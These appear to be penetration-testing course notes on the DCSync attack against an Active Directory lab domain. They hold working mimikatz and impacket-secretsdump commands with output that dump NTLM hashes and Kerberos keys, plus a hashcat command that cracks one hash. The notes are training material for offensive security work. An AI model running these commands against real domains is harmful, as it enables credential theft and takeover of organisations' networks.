StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
...
```

## DSync (Mimikatz/Secretsdump)

To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned. If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a _dcsync_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/domain-controller-synchronization#fn4) attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain. We can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator _Administrator_.

```shell
PS C:\Tools> .\mimikatz.exe
...

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
...

kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1  
```

For now, let's perform the dcsync attack from Linux as well. We'll use impacket-secretsdump to acheive this. To launch it, we'll enter the target username **dave** as an argument for **-just-dc-user** and provide the credentials of a user with the required rights, as well as the IP of the domain controller in the format **domain/user:password@ip**.

```bash
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
```

# Lateral Movement